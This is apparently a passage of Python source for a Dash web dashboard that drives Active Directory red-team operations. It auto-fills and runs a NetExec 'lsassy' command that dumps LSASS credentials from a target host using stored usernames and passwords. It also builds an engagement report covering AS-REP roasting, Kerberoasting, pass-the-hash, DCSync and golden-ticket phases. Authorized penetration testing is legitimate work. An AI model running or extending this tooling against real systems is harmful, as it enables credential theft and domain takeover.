# ── LSASS auto-fill + run ────────────────────────────────────────────────────
@callback(
    Output("ops-lsass-cmd", "value"),
    Input("ops-lsass-fill-btn", "n_clicks"),
    State("ops-cred-store",     "data"),
    prevent_initial_call=True,
)
def fill_lsass(n, creds):
    if not n: raise PreventUpdate
    creds  = creds or {}
    user   = creds.get("user", "USER")
    pw     = creds.get("pass", "PASS")
    dcip   = creds.get("dcip", "TARGET_IP")
    return f"nxc smb {dcip} -u '{user}' -p '{pw}' -M lsassy"


@callback(
    Output("ops-lsass-output", "value", allow_duplicate=True),
    Input("ops-lsass-run-btn", "n_clicks"),
    State("ops-lsass-cmd",    "value"),
    prevent_initial_call=True,
)
def run_lsass(n, cmd):
    if not n or not cmd: raise PreventUpdate
    threading.Thread(target=_run_bg, args=("lsass", cmd), daemon=True).start()
    return f"$ {cmd}\n[Starting…]"


@callback(
    Output("ops-lsass-output", "value"),
    Input("ops-lsass-poll",   "n_intervals"),
    prevent_initial_call=False,
)
def poll_lsass(n): return _get_output("lsass")


# ── Reporting ────────────────────────────────────────────────────────────────
def _build_report_text():
    """Compile all phase job outputs into a structured report."""
    now   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        "=" * 70,
        "  ACTIVE DIRECTORY RED TEAM ENGAGEMENT REPORT",
        f"  Generated: {now}",
        "=" * 70, "",
    ]
    phase_map = {
        "⚔️  Phase 1 — AS-REP Roasting":       "asrep",
        "⚔️  Phase 1 — Kerberoasting":          "kerb",
        "⚔️  Phase 1 — Hash Cracking":          "crack",
        "🔀  Phase 2 — Network Sweep":          "sweep",
        "🔀  Phase 2 — Pass-the-Hash":          "pth",
        "🔀  Phase 2 — Share Enumeration":      "shares",
        "🔀  Phase 2 — Session Enumeration":    "sessions",
        "🏆  Phase 3 — DCSync":                 "dcsync",
        "🏆  Phase 3 — LSASS Dump":             "lsass",
        "🏆  Phase 3 — Golden Ticket":          "gt",
        "🏆  Phase 3 — Cleanup":                "cleanup",
    }
    for label, key in phase_map.items():
        out = _JOB_STORE.get(key, {})
        if not out:
            continue
        lines += ["", "-" * 60, f"  {label}", f"  Started: {out.get('ts','?')}", "-" * 60]
        lines.append(out.get("output", "No output recorded."))

    lines += ["", "=" * 70, "  END OF REPORT", "=" * 70]
    return "\n".join(lines)


@callback(
    Output("ops-report-txt",      "value"),
    Output("ops-report-stats",    "children"),
    Output("ops-report-timeline", "children"),
    Input("ops-report-gen-btn",   "n_clicks"),
    prevent_initial_call=True,
)
def gen_report(n):
    if not n: raise PreventUpdate
    report = _build_report_text()

    phases_run = sum(1 for k in _JOB_STORE)
    stats = html.Div([
        html.Div([html.Span("Phases run: ", style={"color": TEXT_COL}),
                  html.Strong(str(phases_run), style={"color": CYAN})]),
        html.Div([html.Span("Commands executed: ", style={"color": TEXT_COL}),
                  html.Strong(str(len(_JOB_STORE)), style={"color": CYAN})]),
    ])

    timeline_items = []
    for label, key in [("AS-REP", "asrep"), ("Kerberoast", "kerb"), ("DCSync", "dcsync"),
                        ("Sweep", "sweep"), ("LSASS", "lsass")]:
        job = _JOB_STORE.get(key)
        if job:
            timeline_items.append(html.Div([
                html.Span("✅ " if not job.get("running") else "🔄 ",
                          style={"marginRight": "6px"}),
                html.Span(label, style={"color": "#fff", "fontSize": "0.82rem"}),
                html.Span(f"  {job.get('ts','')[:19]}", style={"color": TEXT_COL, "fontSize": "0.72rem"}),
            ], style={"marginBottom": "6px"}))
    timeline = html.Div(timeline_items or [html.Span("No phases run yet.", style={"color": TEXT_COL})])

    return report, stats, timeline


@callback(
    Output("ops-report-download", "data"),
    Input("ops-report-download-btn", "n_clicks"),
    State("ops-report-txt",          "value"),
    prevent_initial_call=True,
)
def download_report(n, txt):
    if not n: raise PreventUpdate
    fname = f"ad_redteam_{datetime.datetime.now().strftime('%Y%m%d_%H%M')}.txt"
    return dcc.send_string(txt or "", filename=fname)
